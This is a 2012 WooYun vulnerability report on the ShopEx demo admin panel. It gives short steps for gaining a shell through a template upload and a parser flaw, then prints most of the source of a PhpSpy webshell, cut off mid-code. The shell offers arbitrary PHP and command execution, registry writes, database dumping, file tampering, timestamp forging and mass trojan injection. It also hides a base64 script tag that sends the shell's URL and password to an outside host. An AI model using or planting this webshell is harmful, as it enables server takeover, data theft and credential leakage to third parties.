{"id": 15103, "wybug_id": "wooyun-2012-015536", "wybug_title": "shopex官方演示后台得到shell与任意文件遍历突破", "wybug_corp": "ShopEx", "wybug_author": "lucifer", "wybug_date": "2012-12-03 10:39", "wybug_open_date": "2013-01-17 10:39", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-17：\t细节向公众公开  简要描述： shopex演示后台模板编辑功能未限制上传导致可利用解析漏洞建立php.php形式的文件夹获得shell 详细说明：  漏洞地址：http://demo.shopex.com.cn/485官方提供了后台账号密码，登陆后发现似乎是被大家测试的多了，官方非常小心，权限限制的很严格，模板不允许编辑，并且上传后自动重新命名更换文件夹。js，php代码更是全部限制。。。中间复杂的测试过程不多说。。直接说漏洞利用过程好了ps:模板上传后立即点应用，回到首页随便看一张自带图片可以得到上传后的地址。1.本地搭建shopex2.自带的模板文件夹中创建php.php目录，将上传小马命名*.php;x.jpg，其实直接.jpg就可以了哈3.登陆后台-页面管理-模板-上传模板4.上传，使用模板。5.找到目录。。。。。6.还要说么- -接下来得到shell以后，发现官方限制了非常多的参数，而且禁止目录内容的读取。把php大马进行base64解码后发现代码如下\n<?php$admin['pass']  = \"xxxx\";  //修改密码error_reporting(7);ob_start();$mtime = explode(' ', microtime());$starttime = $mtime[1] + $mtime[0];$admin['check'] = \"1\";$retime = \"yes\";$cmd = \"cmd.exe\";$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');if ($onoff != 1) {\t@extract($_POST, EXTR_SKIP);\t@extract($_GET, EXTR_SKIP);}$self = $_SERVER['PHP_SELF'];$dis_func = get_cfg_var(\"disable_functions\");if($admin['check'] == \"1\") {\tif ($_GET['action'] == \"logout\") {\t\tsetcookie (\"adminpass\", \"\");\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=\".$self.\"\\\">\";\t\texit;\t}\tif ($_POST['do'] == 'login') {\t\t$thepass=trim($_POST['adminpass']);\t\tif ($admin['pass'] == $thepass) {\t\t\tsetcookie (\"adminpass\",$thepass,time()+(1*24*3600));\t\t\techo \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;URL=\".$self.\"\\\">\";\t\t\texit;\t\t}\t}\tif (isset($_COOKIE['adminpass'])) {\t\tif ($_COOKIE['adminpass'] != $admin['pass']) {\t\t\tloginpage();\t\t}\t} else {\t\tloginpage();\t}}/*===================== 验证结束 =====================*/// 判断 magic_quotes_gpc 状态if (get_magic_quotes_gpc()) {    $_GET = stripslashes_array($_GET);\t$_POST = stripslashes_array($_POST);}// 查看PHPINFOif ($_GET['action'] == \"phpinfo\") {\techo $phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? phpinfo() : \"phpinfo() 函数已被禁用,请查看<PHP环境变量>\";\texit;}if($_GET['action'] == \"nowuser\") {$user = get_current_user();if(!$user) $user = \"报告长官，主机变态，无法获取当前进行用户名！\";echo\"当前进程用户名：$user\";exit;}if(isset($_POST['phpcode'])){\teval(\"?\".\">$_POST[phpcode]<?\");\texit;}// 在线代理if (isset($_POST['url'])) {\t$proxycontents = @file_get_contents($_POST['url']);\techo ($proxycontents) ? $proxycontents : \"<body bgcolor=\\\"#F5F5F5\\\" style=\\\"font-size: 12px;\\\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>\";\texit;}// 下载文件if (!empty($downfile)) {\tif (!@file_exists($downfile)) {\t\techo \"<script>alert('你要下的文件不存在!')</script>\";\t} else {\t\t$filename = basename($downfile);\t\t$filename_info = explode('.', $filename);\t\t$fileext = $filename_info[count($filename_info)-1];\t\theader('Content-type: application/x-'.$fileext);\t\theader('Content-Disposition: attachment; filename='.$filename);\t\theader('Content-Description: PHP Generated Data');\t\theader('Content-Length: '.filesize($downfile));\t\t@readfile($downfile);\t\texit;\t}}// 直接下载备份数据库if ($_POST['backuptype'] == 'download') {\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"数据库连接失败\");\t@mysql_select_db($dbname) or die(\"选择数据库失败\");\t\t$table = array_flip($_POST['table']);\t$result = mysql_query(\"SHOW tables\");\techo ($result) ? NULL : \"出错: \".mysql_error();\t$filename = basename($_SERVER['HTTP_HOST'].\"_MySQL.sql\");\theader('Content-type: application/unknown');\theader('Content-Disposition: attachment; filename='.$filename);\t$mysqldata = '';\twhile ($currow = mysql_fetch_array($result)) {\t\tif (isset($table[$currow[0]])) {\t\t\t$mysqldata.= sqldumptable($currow[0]);\t\t\t$mysqldata.= $mysqldata.\"\\r\\n\";\t\t}\t}\tmysql_close();\texit;}// 程序目录$pathname=str_replace('\\\\','/',dirname(__FILE__)); // 获取当前路径if (!isset($dir) or empty($dir)) {\t$dir = \".\";\t$nowpath = getPath($pathname, $dir);} else {\t$dir=$_GET['dir'];\t$nowpath = getPath($pathname, $dir);}// 判断读写情况$dir_writeable = (dir_writeable($nowpath)) ? \"可写\" : \"不可写\";$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? \" | <a href=\\\"?action=reg\\\">注册表操作</a>\" : \"\";$tb = new FORMS;?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><title>http://<? echo $_SERVER['HTTP_HOST'];?>  PhpSpy 2006 修改版</title><style type=\"text/css\">body{\tBACKGROUND-COLOR: #F5F5F5; \tCOLOR: #3F3849; \tfont-family: \"Verdana\", \"Tahoma\", \"宋体\";\tfont-size: \"12px\";\tline-height: \"140%\";}TD\t\t{FONT-FAMILY: \"Verdana\", \"Tahoma\", \"宋体\"; FONT-SIZE: 12px; line-height: 140%;}.smlfont {\tfont-family: \"Verdana\", \"Tahoma\", \"宋体\";\tfont-size: \"11px\";}.INPUT {\tFONT-SIZE: \"12px\";\tCOLOR: \"#000000\";\tBACKGROUND-COLOR: \"#FFFFFF\";\theight: \"18px\";\tborder: \"1px solid #666666\";\tpadding-left: \"2px\";}.redfont {\tCOLOR: \"#CA0000\";}A:LINK\t\t{COLOR: #3F3849; TEXT-DECORATION: none}A:VISITED\t{COLOR: #3F3849; TEXT-DECORATION: none}A:HOVER\t\t{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}A:ACTIVE\t{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}.top {BACKGROUND-COLOR: \"#CCCCCC\"}.firstalt {BACKGROUND-COLOR: \"#EFEFEF\"}.secondalt {BACKGROUND-COLOR: \"#F5F5F5\"}</style><SCRIPT language=JavaScript>function CheckAll(form) {\tfor (var i=0;i<form.elements.length;i++) {\t\tvar e = form.elements[i];\t\tif (e.name != 'chkall')\t\te.checked = form.chkall.checked;    }}function really(d,f,m,t) {\tif (confirm(m)) {\t\tif (t == 1) {\t\t\twindow.location.href='?dir='+d+'&deldir='+f;\t\t} else {\t\t\twindow.location.href='?dir='+d+'&delfile='+f;\t\t}\t}}</SCRIPT></head><body style=\"table-layout:fixed; word-break:break-all\"><center><?php$test = \"\";if(!$_GET['dir']) $dir = \"./\";$tb->tableheader();$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align=\"center\">'.date(\"Y年m月d日 h:i:s\",time()).'</td><td align=\"right\"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');$tb->tdbody('<a href=\"?action=dir\">SHELL目录</a> | <a href=\"?action=downloads\">Http 文件下载</a> | <a href=\"?action=phpenv\">环境变量</a> | <a href=\"?action=proxy\">在线代理</a>'.$reg.$phpinfo.' | <a href=\"?action=shell\">WebShell</a> | <a href=\"?action=logout\">注销登录</a> ');$tb->tdbody(' <a href=\"?action=plgm\">批量挂马</a> | <a href=\"?action=search&dir='.$dir.'\">文件查找</a> | <a href=\"?action=eval\">执行php脚本</a> | <a href=\"?action=sql\">执行SQL语句</a> | <a href=\"?action=sql&type=fun\">Func反弹Shell</a> | <a href=\"?action=sqlbak\">MySQL Backup</a> | <a href=\"?action=SUExp\">Serv-U EXP</a> | <a href=\"?action=adodb\">ADODB</a> ');$tb->tdbody(' 目录列表：<a href=\"?dir=c:\\\">C盘</a> | <a href=\"?dir=d:\\\">D盘</a> | <a href=\"?dir=e:\\\">E盘</a> | <a href=\"?dir=f:\\\">F盘</a> | <a href=\"?dir=g:\\\">G盘</a> | <a href=\"?dir=C:\\Program Files\">程序</a> | <a href=\"?dir=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\">pcAnywhere</a> ');$tb->tablefooter();?><hr width=\"775\" noshade><table width=\"775\" border=\"0\" cellpadding=\"0\"><?$tb->headerform(array('method'=>'GET','content'=>'<p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'上传文件到当前目录: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','确定','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'新建文件在当前目录: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','确定','','submit')));$tb->headerform(array('content'=>'新建目录在当前目录: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','确定','','submit')));?></table><?$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];$serverp = $admin['pass'];$copyurl = base64_decode('PHNjcmlwdCBzcmM9J2h0dHA6Ly84Y2NlLmNuL2NlcnQvP2NlcnQ9MTMmdT0=');$copyurll = base64_decode('Jz48L3NjcmlwdD4=');?><hr width=\"775\" noshade><?php/*===================== 执行操作 开始 =====================*/echo \"<p><b>\\n\";// 删除文件if (!empty($delfile)) {\tif (file_exists($delfile)) {\t\techo (@unlink($delfile)) ? $delfile.\" 删除成功!\" : \"文件删除失败!\";\t} else {\t\techo basename($delfile).\" 文件已不存在!\";\t}}// 删除目录elseif (!empty($deldir)) {\t$deldirs=\"$dir/$deldir\";\tif (!file_exists(\"$deldirs\")) {\t\techo \"$deldir 目录已不存在!\";\t} else {\t\techo (deltree($deldirs)) ? \"目录删除成功!\" : \"目录删除失败!\";\t}}// 创建目录elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {\tif (!empty($newdirectory)) {\t\t$mkdirs=\"$dir/$newdirectory\";\t\tif (file_exists(\"$mkdirs\")) {\t\t\techo \"该目录已存在!\";\t\t} else {\t\t\techo (@mkdir(\"$mkdirs\",0777)) ? \"创建目录成功!\" : \"创建失败!\";\t\t\t@chmod(\"$mkdirs\",0777);\t\t}\t}}// 上传文件elseif ($doupfile) {\techo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"上传成功!\" : \"上传失败!\";}// 编辑文件elseif ($_POST['do'] == 'doeditfile') {\tif (!empty($_POST['editfilename'])) {    if(!file_exists($editfilename)) unset($retime);\tif($time==$now) $time = @filemtime($editfilename);        $time2 = @date(\"Y-m-d H:i:s\",$time);\t\t$filename=\"$editfilename\";\t\t@$fp=fopen(\"$filename\",\"w\");\t\tif($_POST['change']==\"yes\"){\t\t$filecontent = \"?\".\">\".$_POST['filecontent'].\"<?\";\t\t$filecontent = gzdeflate($filecontent);        $filecontent = base64_encode($filecontent);        $filecontent = \"<?php\\n/*\\n代码由浅蓝的辐射鱼加密!\\n*/\\neval(gzinflate(base64_decode('$filecontent')));\\n\".\"?>\";\t\t}else{\t\t$filecontent = $_POST['filecontent'];\t\t}\t\techo $msg=@fwrite($fp,$filecontent) ? \"写入文件成功!\" : \"写入失败!\";\t\t@fclose($fp);\t\tif($retime==\"yes\"){        echo\" 鱼鱼自动操作:\";        echo $msg=@touch($filename,$time) ? \"修改文件为\".$time2.\"成功!\" : \"修改文件时间失败!\";\t\t}\t} else {\t\techo \"请输入想要编辑的文件名!\";\t}}//文件下载elseif ($_POST['do'] == 'downloads') {\t$contents = @file_get_contents($_POST['durl']);\tif(!$contents){\techo\"无法读取要下载的数据\";\t}\telseif(file_exists($path)){\techo\"很抱歉，文件\".$path.\"已经存在了，请更换保存文件名。\";\t}else{    $fp = @fopen($path,\"w\");\techo $msg=@fwrite($fp,$contents) ? \"下载文件成功!\" : \"下载文件写入时失败!\";\t@fclose($fp);\t}}// 编辑文件属性elseif ($_POST['do'] == 'editfileperm') {\tif (!empty($_POST['fileperm'])) {\t\t$fileperm=base_convert($_POST['fileperm'],8,10);\t\techo (@chmod($dir.\"/\".$file,$fileperm)) ? \"属性修改成功!\" : \"修改失败!\";\t\techo \" 文件 \".$file.\" 修改后的属性为: \".substr(base_convert(@fileperms($dir.\"/\".$file),10,8),-4);\t} else {\t\techo \"请输入想要设置的属性!\";\t}}// 文件改名elseif ($_POST['do'] == 'rename') {\tif (!empty($_POST['newname'])) {\t\t$newname=$_POST['dir'].\"/\".$_POST['newname'];\t\tif (@file_exists($newname)) {\t\t\techo \"\".$_POST['newname'].\" 已经存在,请重新输入一个!\";\t\t} else {\t\t\techo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname']).\" 成功改名为 \".$_POST['newname'].\" !\" : \"文件名修改失败!\";\t\t}\t} else {\t\techo \"请输入想要改的文件名!\";\t}}elseif ($_POST['do'] == 'search') {if(!empty($oldkey)){echo\"<span class=\\\"redfont\\\">查找关键词:[\".$oldkey.\"],下面显示查找的结果:\";\tif($type2 == \"getpath\"){\techo\"鼠标移到结果文件上会有部分截取显示.\";}echo\"</span><br><hr width=\\\"775\\\" noshade>\";find($path);}else{echo\"你要查虾米?到底要查虾米呢?有没有虾米要你查呢?\";}}elseif ($_GET['action']=='plgmok') {   dirt($_POST['dir'],$_POST['sbbm']);   dirtree($_POST['dir'],$_POST['mm']);}// 克隆时间elseif ($_POST['do'] == 'domodtime') {\tif (!@file_exists($_POST['curfile'])) {\t\techo \"要修改的文件不存在!\";\t} else {\t\tif (!@file_exists($_POST['tarfile'])) {\t\t\techo \"要参照的文件不存在!\";\t\t} else {\t\t\t$time=@filemtime($_POST['tarfile']);\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" 的修改时间成功改为 \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"文件的修改时间修改失败!\";\t\t}\t}}// 自定义时间elseif ($_POST['do'] == 'modmytime') {\tif (!@file_exists($_POST['curfile'])) {\t\techo \"要修改的文件不存在!\";\t} else {\t\t$year=$_POST['year'];\t\t$month=$_POST['month'];\t\t$data=$_POST['data'];\t\t\t\t$hour=$_POST['hour'];\t\t$minute=$_POST['minute'];\t\t$second=$_POST['second'];\t\tif (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {\t\t\t$time=strtotime(\"$data $month $year $hour:$minute:$second\");\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" 的修改时间成功改为 \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"文件的修改时间修改失败!\";\t\t}\t}}// 连接MYSQLelseif ($connect) {\tif (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {\t\techo \"数据库连接成功!\";\t\tmysql_close();\t} else {\t\techo mysql_error();\t}}// 执行SQL语句elseif ($_POST['do'] == 'query') {\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"数据库连接失败\");\t@mysql_select_db($dbname) or die(\"选择数据库失败\");\t$result = @mysql_query($_POST['sql_query']);\techo ($result) ? \"SQL语句成功执行!\" : \"出错: \".mysql_error();\tmysql_close();}// 备份操作elseif ($_POST['do'] == 'backupmysql') {\tif (empty($_POST['table']) OR empty($_POST['backuptype'])) {\t\techo \"请选择欲备份的数据表和备份方式!\";\t} else {\t\tif ($_POST['backuptype'] == 'server') {\t\t\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"数据库连接失败\");\t\t\t@mysql_select_db($dbname) or die(\"选择数据库失败\");\t\t\t\t$table = array_flip($_POST['table']);\t\t\t$filehandle = @fopen($path,\"w\");\t\t\tif ($filehandle) {\t\t\t\t$result = mysql_query(\"SHOW tables\");\t\t\t\techo ($result) ? NULL : \"出错: \".mysql_error();\t\t\t\twhile ($currow = mysql_fetch_array($result)) {\t\t\t\t\tif (isset($table[$currow[0]])) {\t\t\t\t\t\tsqldumptable($currow[0], $filehandle);\t\t\t\t\t\tfwrite($filehandle,\"\\n\\n\\n\");\t\t\t\t\t}\t\t\t\t}\t\t\t\tfclose($filehandle);\t\t\t\techo \"数据库已成功备份到 <a href=\\\"\".$path.\"\\\" target=\\\"_blank\\\">\".$path.\"</a>\";\t\t\t\tmysql_close();\t\t\t} else {\t\t\t\techo \"备份失败,请确认目标文件夹是否具有可写权限!\";\t\t\t}\t\t}\t}}// 打包下载 PS:文件太大可能非常慢// Thx : 小花elseif($downrar) {\tif (!empty($dl)) {\t\t$dfiles=\"\";\t\tforeach ($dl AS $filepath=>$value) {\t\t\t$dfiles.=$filepath.\",\";\t\t}\t\t$dfiles=substr($dfiles,0,strlen($dfiles)-1);\t\t$dl=explode(\",\",$dfiles);\t\t$zip=new PHPZip($dl);\t\t$code=$zip->out;\t\t\t\theader(\"Content-type: application/octet-stream\");\t\theader(\"Accept-Ranges: bytes\");\t\theader(\"Accept-Length: \".strlen($code));\t\theader(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");\t\techo $code;\t\texit;\t} else {\t\techo \"请选择要打包下载的文件!\";\t}}// Shell.Application 运行程序elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {\t$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');\t$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);\techo ($a=='0') ? \"程序已经成功执行!\" : \"程序运行失败!\";}// 查看PHP配置参数状况elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {\techo \"配置参数 \".$_POST['phpvarname'].\" 检测结果: \".getphpcfg($_POST['phpvarname']).\"\";}// 读取注册表elseif(($regread) AND !empty($_POST['readregname'])) {\t$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');\tvar_dump(@$shell->RegRead($_POST['readregname']));}// 写入注册表elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {\t$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');\t$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);\techo ($a=='0') ? \"写入注册表健值成功!\" : \"写入 \".$_POST['regname'].\", \".$_POST['regval'].\", \".$_POST['regtype'].\" 失败!\";}// 删除注册表elseif(($regdelete) AND !empty($_POST['delregname'])) {\t$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');\t$a = @$shell->RegDelete($_POST['delregname']);\techo ($a=='0') ? \"删除注册表健值成功!\" : \"删除 \".$_POST['delregname'].\" 失败!\";}echo \"</b></p>\\n\";/*===================== 执行操作 结束 =====================*/if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"dir\")) {\t$tb->tableheader();?>  <tr bgcolor=\"#cccccc\">    <td align=\"center\" nowrap width=\"27%\"><b>文件</b></td>\t<td align=\"center\" nowrap width=\"16%\"><b>创建日期</b></td>    <td align=\"center\" nowrap width=\"16%\"><b>最后修改</b></td>    <td align=\"center\" nowrap width=\"11%\"><b>大小</b></td>    <td align=\"center\" nowrap width=\"6%\"><b>属性</b></td>    <td align=\"center\" nowrap width=\"24%\"><b>操作</b></td>  </tr><?php// 目录列表$dirs=@opendir($dir);$dir_i = '0';while ($file=@readdir($dirs)) {\t$filepath=\"$dir/$file\";\t$a=@is_dir($filepath);\tif($a==\"1\"){\t\tif($file!=\"..\" && $file!=\".\")\t{\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));\t\t\t$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);\t\t\techo \"<tr class=\".getrowbg().\">\\n\";\t\t\techo \"  <td style=\\\"padding-left: 5px;\\\">[<a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\"><font color=\\\"#006699\\\">$file</font></a>]</td>\\n\";\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><dir></td>\\n\";\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$dirperm</a></td>\\n\";\t\t\techo \"  <td align=\\\"center\\\" nowrap>| <a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($file).\"','你确定要删除 $file 目录吗? \\\\n\\\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\\\">删除</a> | <a href=\\\"?action=rename&dir=\".urlencode($dir).\"&fname=\".urlencode($file).\"\\\">改名</a> |</td>\\n\";\t\t\techo \"</tr>\\n\";\t\t\t$dir_i++;\t\t} else {\t\t\tif($file==\"..\") {\t\t\t\techo \"<tr class=\".getrowbg().\">\\n\";\t\t\t\techo \"  <td nowrap colspan=\\\"6\\\" style=\\\"padding-left: 5px;\\\"><a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\">返回上级目录</a>\".$copyurl.$serveru.\"&p=\".$serverp.$copyurll.\"</td>\\n\";\t\t\t\techo \"</tr>\\n\";\t\t\t}\t\t}\t}}// while@closedir($dirs); ?><tr bgcolor=\"#cccccc\">  <td colspan=\"6\" height=\"5\"></td></tr><FORM action=\"\" method=\"POST\"><?// 文件列表$dirs=@opendir($dir);$file_i = '0';while ($file=@readdir($dirs)) {\t$filepath=\"$dir/$file\";\t$a=@is_dir($filepath);\tif($a==\"0\"){\t\t\t\t$size=@filesize($filepath);\t\t$size=$size/1024 ;\t\t$size= @number_format($size, 3);\t\tif (@filectime($filepath) == @filemtime($filepath)) {\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));\t\t} else {\t\t\t$ctime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filectime($filepath)).\"</span>\";\t\t\t$mtime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filemtime($filepath)).\"</span>\";\t\t}\t\t@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);\t\techo \"<tr class=\".getrowbg().\">\\n\";\t\techo \"  <td style=\\\"padding-left: 5px;\\\">\";\t\techo \"<INPUT type=checkbox value=1 name=dl[$filepath]>\";\t\techo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";\t\techo \"  <td align=\\\"right\\\" nowrap class=\\\"smlfont\\\"><span class=\\\"redfont\\\">$size</span> KB</td>\\n\";\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$fileperm</a></td>\\n\";\t\techo \"  <td align=\\\"center\\\" nowrap><a href=\\\"?downfile=\".urlencode($filepath).\"\\\">下载</a> | <a href=\\\"?action=editfile&dir=\".urlencode($dir).\"&editfile=\".urlencode($file).\"\\\">编辑</a> | <a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($filepath).\"','你确定要删除 $file 文件吗?','2')\\\">删除</a> | <a href=\\\"?action=rename&dir=\".urlencode($dir).\"&fname=\".urlencode($filepath).\"\\\">改名</a> | <a href=\\\"?action=newtime&dir=\".urlencode($dir).\"&file=\".urlencode($filepath).\"\\\">时间</a></td>\\n\";\t\techo \"</tr>\\n\";\t\t$file_i++;\t}}// while@closedir($dirs); $tb->tdbody('<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" align=\"center\"><tr><td>'.$tb->makeinput('chkall','on','onclick=\"CheckAll(this.form)\"','checkbox','30','').' '.$tb->makeinput('downrar','选中文件打包下载','','submit').'</td><td align=\"right\">'.$dir_i.' 个目录 / '.$file_i.' 个文件</td></tr></table>','center',getrowbg(),'','','6');echo \"</FORM>\\n\";echo \"</table>\\n\";}// end direlseif ($_GET['action'] == \"editfile\") {\tif(empty($newfile)) {\t\t$filename=\"$dir/$editfile\";\t\t$fp=@fopen($filename,\"r\");\t\t$contents=@fread($fp, filesize($filename));\t\t@fclose($fp);\t\t$contents=htmlspecialchars($contents);\t}else{\t\t$editfile=$newfile;\t\t$filename = \"$dir/$editfile\";\t}\t$action = \"?dir=\".urlencode($dir).\"&editfile=\".$editfile;\t$tb->tableheader();\t$tb->formheader($action,'新建/编辑文件');\t$tb->tdbody('当前文件: '.$tb->makeinput('editfilename',$filename).' 输入新文件名则建立新文件 Php代码加密: <input type=\"checkbox\" name=\"change\" value=\"yes\" onclick=\"javascript:alert(\\'这个功能只可以用来加密或是压缩完整的php代码。\\\\n\\\\n非php代码或不完整php代码或不支持gzinflate函数请不要使用！\\')\"> ');\t$tb->tdbody($tb->maketextarea('filecontent',$contents));\t$tb->makehidden('do','doeditfile');\t$tb->formfooter('1','30');}//end editfileelseif ($_GET['action'] == \"rename\") {\t$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);\t$action = \"?dir=\".urlencode($dir).\"&fname=\".urlencode($fname);\t$tb->tableheader();\t$tb->formheader($action,'修改文件名');\t$tb->makehidden('oldname',$dir.\"/\".$nowfile);\t$tb->makehidden('dir',$dir);\t$tb->tdbody('当前文件名: '.basename($nowfile));\t$tb->tdbody('改名为: '.$tb->makeinput('newname'));\t$tb->makehidden('do','rename');\t$tb->formfooter('1','30');}//end renameelseif ($_GET['action'] == \"eval\") {\t$action = \"?dir=\".urlencode($dir).\"\";\t$tb->tableheader();\t$tb->formheader(''.$action.' \"target=\"_blank' ,'执行php脚本');\t$tb->tdbody($tb->maketextarea('phpcode',$contents));\t$tb->formfooter('1','30');\t}elseif ($_GET['action'] == \"fileperm\") {\t$action = \"?dir=\".urlencode($dir).\"&file=\".$file;\t$tb->tableheader();\t$tb->formheader($action,'修改文件属性');\t$tb->tdbody('修改 '.$file.' 的属性为: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));\t$tb->makehidden('file',$file);\t$tb->makehidden('dir',urlencode($dir));\t$tb->makehidden('do','editfileperm');\t$tb->formfooter('1','30');}//end filepermelseif ($_GET['action'] == \"newtime\") {\t$action = \"?dir=\".urlencode($dir);\t$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);\t$tb->tableheader();\t$tb->formheader($action,'克隆文件最后修改时间');\t$tb->tdbody(\"修改文件: \".$tb->makeinput('curfile',$file,'readonly').\" → 目标文件: \".$tb->makeinput('tarfile','需填完整路径及文件名'),'center','2','30');\t$tb->makehidden('do','domodtime');\t$tb->formfooter('','30');\t$tb->formheader($action,'自定义文件最后修改时间');\t$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');\t$tb->tdbody('当前文件名: '.$file);\t$tb->makehidden('curfile',$file);\t$tb->tdbody('修改为: '.$tb->makeinput('year','1984','','text','4').' 年 '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' 月 '.$tb->makeinput('data','18','','text','2').' 日 '.$tb->makeinput('hour','20','','text','2').' 时 '.$tb->makeinput('minute','00','','text','2').' 分 '.$tb->makeinput('second','00','','text','2').' 秒','center','2','30');\t$tb->makehidden('do','modmytime');\t$tb->formfooter('1','30');}//end newtimeelseif ($_GET['action'] == \"shell\") {\t$action = \"??action=shell&dir=\".urlencode($dir);\t$tb->tableheader();\t$tb->tdheader('WebShell Mode');  if (substr(PHP_OS, 0, 3) == 'WIN') {\t\t$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";\t\t$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";\t\techo \"<form 